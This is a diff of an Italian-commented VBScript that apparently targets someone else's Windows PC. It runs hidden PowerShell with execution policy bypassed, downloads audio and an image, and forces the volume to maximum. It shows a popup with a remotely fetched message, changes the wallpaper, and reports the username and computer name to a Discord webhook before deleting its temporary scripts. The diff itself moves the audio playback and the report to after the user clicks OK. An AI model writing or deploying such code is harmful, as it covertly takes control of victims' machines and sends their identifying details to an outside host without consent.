@@ -19,13 +19,13 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%")
 nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
 
-' --- 1. CONFIGURAZIONE VOLUME ---
+' --- 1. CONFIGURAZIONE VOLUME (UNMUTE + MAX) ---
 shell.SendKeys Chr(&hAD) 
 For i = 1 To 50
-    shell.SendKeys Chr(&hAF)
+    shell.SendKeys Chr(&hAF) 
 Next
 
-' --- 2. DOWNLOAD AUDIO ---
+' --- 2. DOWNLOAD DELL'AUDIO (PREPARAZIONE) ---
 percorsoAudio = shell.ExpandEnvironmentStrings("%TEMP%") & "\audio.mp3"
 scriptDownloadAudio = shell.ExpandEnvironmentStrings("%TEMP%") & "\dl_audio.ps1"
 
@@ -38,14 +38,10 @@ Set fAudio = fso.CreateTextFile(scriptDownloadAudio, True)
 fAudio.Write psDownload
 fAudio.Close
 
+' Scarichiamo il file audio subito, così è pronto per dopo
 shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptDownloadAudio & """", 0, True
 
-' --- 3. RIPRODUZIONE AUDIO ---
-If fso.FileExists(percorsoAudio) Then
-    shell.Run "wmplayer.exe """ & percorsoAudio & """ /Play", 7, False
-End If
-
-' --- 4. RECUPERA MESSAGGIO ---
+' --- 3. RECUPERA IL MESSAGGIO ---
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 xmlHttp.Open "GET", urlMessaggio, False
 xmlHttp.Send
@@ -53,7 +49,8 @@ If xmlHttp.Status = 200 Then
     messaggioDalWeb = Trim(xmlHttp.responseText)
 End If
 
-' --- 5. POPUP E NOTIFICA ---
+' --- 4. MOSTRA IL POPUP ---
+' Lo script si ferma qui finché l'utente non preme OK
 If messaggioDalWeb <> "" Then
     Dim comandoPopup
     comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
@@ -65,20 +62,22 @@ If messaggioDalWeb <> "" Then
         "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
         "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
     
+    ' Esegue e attende la chiusura (True)
     shell.Run comandoPopup, 0, True
-    InviaNotificaDiscordPS webhookURL, nomeUtente, nomePC, messaggioDalWeb
 End If
 
-' --- 6. CAMBIO SFONDO (CON RITARDO) ---
-' Definiamo il percorso fisso
+' --- 5. RIPRODUZIONE AUDIO E NOTIFICA (DOPO OK) ---
+' Ora che l'utente ha premuto OK, facciamo partire la musica
+If fso.FileExists(percorsoAudio) Then
+    shell.Run "wmplayer.exe """ & percorsoAudio & """ /Play", 7, False
+End If
+
+' Invia notifica Discord che l'utente ha interagito
+InviaNotificaDiscordPS webhookURL, nomeUtente, nomePC, messaggioDalWeb
+
+' --- 6. CAMBIO SFONDO (CON RITARDO ANTI-CACHE) ---
 percorsoLocaleImg = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
 percorsoScriptWp = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"
-
-' Logica modificata:
-' 1. CANCELLA la vecchia immagine (se esiste).
-' 2. SCARICA la nuova.
-' 3. ASPETTA (Start-Sleep -Seconds 3) per essere sicuri che il file sia scritto e sbloccato.
-' 4. IMPOSTA lo sfondo.
 
 scriptWp = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
     "if (Test-Path '" & percorsoLocaleImg & "') { Remove-Item '" & percorsoLocaleImg & "' -Force; Start-Sleep -Milliseconds 500; } " & _
@@ -105,42 +104,34 @@ WScript.Sleep 3000
 If fso.FileExists(percorsoScriptWp) Then fso.DeleteFile percorsoScriptWp
 If fso.FileExists(scriptDownloadAudio) Then fso.DeleteFile scriptDownloadAudio
 
-
 ' --- FUNZIONE NOTIFICA DISCORD ---
 Sub InviaNotificaDiscordPS(webhook, utente, pc, messaggio)
     On Error Resume Next
     Dim scriptWebhook, percorsoWebhook, messaggioEscaped, fwh
-    
     messaggioEscaped = Replace(messaggio, """", "\""")
     messaggioEscaped = Replace(messaggioEscaped, "'", "''")
-    
     percorsoWebhook = shell.ExpandEnvironmentStrings("%TEMP%") & "\webhook_notify.ps1"
-    
     scriptWebhook = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
                     "$webhook = '" & webhook & "'; " & _
                     "$payload = @{" & _
-                    "content = 'Script Eseguito'; " & _
+                    "content = 'Script Eseguito - OK Premuto'; " & _
                     "embeds = @(@{" & _
                     "title = 'Report Attività'; " & _
                     "color = 16711680; " & _
                     "fields = @(" & _
                     "@{name='Utente'; value='" & utente & "'; inline=$true}," & _
                     "@{name='PC'; value='" & pc & "'; inline=$true}," & _
-                    "@{name='Messaggio Visualizzato'; value='" & messaggioEscaped & "'; inline=$false}," & _
-                    "@{name='Audio'; value='Avviato con WMPlayer'; inline=$false}," & _
-                    "@{name='Timestamp'; value='" & Now() & "'; inline=$false}" & _
+                    "@{name='Messaggio'; value='" & messaggioEscaped & "'; inline=$false}," & _
+                    "@{name='Azione'; value='L utente ha premuto OK, musica partita'; inline=$false}" & _
                     "); " & _
                     "footer = @{text='Remote Script Log'}" & _
                     "})" & _
                     "} | ConvertTo-Json -Depth 4; " & _
                     "Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'"
-    
     Set fwh = fso.CreateTextFile(percorsoWebhook, True)
     fwh.Write scriptWebhook
     fwh.Close
-    
     shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoWebhook & """", 0, True
-    
     WScript.Sleep 2000
     If fso.FileExists(percorsoWebhook) Then fso.DeleteFile percorsoWebhook
 End Sub
